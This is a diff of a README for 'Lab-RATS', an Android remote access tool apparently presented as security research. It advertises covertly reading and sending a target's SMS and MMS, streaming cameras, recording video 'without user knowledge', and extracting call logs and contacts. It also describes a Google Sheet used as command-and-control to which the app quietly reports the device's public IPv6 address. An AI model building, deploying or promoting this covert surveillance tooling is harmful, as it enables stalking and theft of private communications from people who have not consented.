@@ -17,13 +17,16 @@
 
 ## 🚀 The Fun Stuff
 
--   **SMS Message Viewer & Sender**:
--   -   View **ALL Text Messages** on **Target Phone**
--   -   Send **Text Messages From Target Phone** to **ANY Number**.
--   **Live Screen Capture, Stream, & Record**:
--   -   Take **Live Screenshots**.
--   -   Capture **Live Screen** Recordings
-    -   View **User Screen Activity** in **Real-Time**
+-   **View MMS/Picture Messages**: *(Game Changer...You're Welcome...)*
+-   -   **Browse** & **Download ANY MMS/Picture Messages** that the **Target Device** has ever **Sent** or **Received**.
+-   **View SMS/Text Messages & Send SMS/Text Messages**:
+-   -   **Browse** & **Copy ANY SMS/Text Messages** that the **Target Device** has ever **Sent** or **Received**.
+-   -   **Send Text Messages From Target Phone** to **ANY Number**.
+-   -   The "**MMS/SMS Received From Address**" will display as a **Saved Contact Name** if the **Name** is **Saved** on the **Targets Device** in the **Contacts App**.*(If not, will just  show the Phone Number the message is from)*.
+-   **Live Screen Capture, Stream, & Record**: *(Work In Progress)*
+-   -   Take **Live Screenshots**. *(WIP)*
+-   -   Capture **Live Screen** Recordings. *(WIP)*
+    -   View **User Screen Activity** in **Real-Time**. *(WIP)*
 -   **Live Camera Streaming**: View **real-time camera feed** from both **front and back cameras** directly in your **browser**.
 -   **Background Video Recording**: **Record high-quality video** in the background **without** user knowledge.
 -   **Photo Capture**: Take **instant photos** from **any** available camera.
@@ -35,7 +38,7 @@
     -   **Full Call Log** access.
     -   **Contact list** extraction.
 -   **Device Information**: **Detailed** system, network, hardware, and battery status.
--   **Auto-Reporting**: **Automatically sends** device IP and connection links to a **correctly configured Google Sheet**.
+-   **Auto-Reporting**: **Automatically sends** device IP and connection links to a **Correctly Configured Google Sheet**.
 
 ---
 
@@ -54,14 +57,14 @@
 
 ## 🧠 Direct IPv6 Access
 
-During **security research**, a **fascinating** behavior in **modern Android networking** was **discovered**. When an Android device **connects to mobile data** *(and many modern WiFi networks)*, it is assigned a **Public IPv6 Address**.
+During **security research**, a **fascinating behavior** in **modern Android networking** was **discovered**. When an Android device **connects to mobile data** *(and many modern WiFi networks)*, it is assigned a **Public IPv6 Address**.
 
 **Unlike** IPv4, which is **heavily NAT'd** *(Network Address Translation)* and requires **complex Port Forwarding** to access from the outside, **IPv6 addresses are often directly routeable on the public internet**.
 
 ### How Lab-RATS Exploits This:
 
 1.  **Local HTTP Server**: The app starts a **lightweight HTTP server** on the Android device *(Port 8080)*.
-2.  **The IPv6 Feature/Bug**: Because the device has a Public IPv6, **you can access this server directly from anywhere in the world** just by typing the **IP address** into your browser. (**No router config, no firewall bypass, no NGROK**)
+2.  **The IPv6 Feature/Bug**: Because the device has a Public IPv6, **you can access this server directly from anywhere in the world** just by typing the **IP address** into your browser. (**No router config, no firewall bypass, no Pinggy/Ngrok**)
 3.  **The Problem** *(Dynamic IPs)*: **Mobile** networks **rotate IPs frequently**. Your **target's IP changes** every time they **reconnect**.
 4.  **The Solution** *(Google Sheets)*: We use a **simple Google Sheet** as a **"Command & Control" (C2)** tracker. The app **detects** its own **Public IPv6** and **quietly posts** it to your **Google Sheet.** You **open the sheet**, click the **link**, and you are connected **directly to the device**.
 
@@ -72,9 +75,9 @@ During **security research**, a **fascinating** behavior in **modern Android net
 ## 🛠️ Getting Started
 
 ### 1. Requirements
--   **Java 11 or 21** installed on your PC.
--   An **Android** device (target).
--   A **Google Sheet URL** for IP reporting.
+-   **Java 11 or 21** installed on your **PC**.
+-   An **Android** device *(target)*.
+-   A **Google Sheet URL** for IP **reporting**.
 
 ### 2. Building the APK
 1.  **Download** & **extract** the zip file.
@@ -102,7 +105,7 @@ During **security research**, a **fascinating** behavior in **modern Android net
 
 1. Create **Google Sheet**
 2. **Extensions** → **Apps Script**
-3. **Paste** this code in:
+3. **Paste** this **Code** in:
 
 ```javascript
 // Lab-RATS Remote Reporting Script
@@ -143,7 +146,7 @@ function setupSheet() {
 
 If you find **Lab-RATS** useful, **please** consider giving the project a **Star** ⭐ — it **helps** a lot!
 
-**Feel free** to **open issues** or **submit pull requests**. **Contributions** are **always welcome**!
+**Feel free** to **Open Issues** or **Submit Pull Requests**. **Contributions** are **always welcome**!
 
 **Donations** *(optional but greatly appreciated)*
 
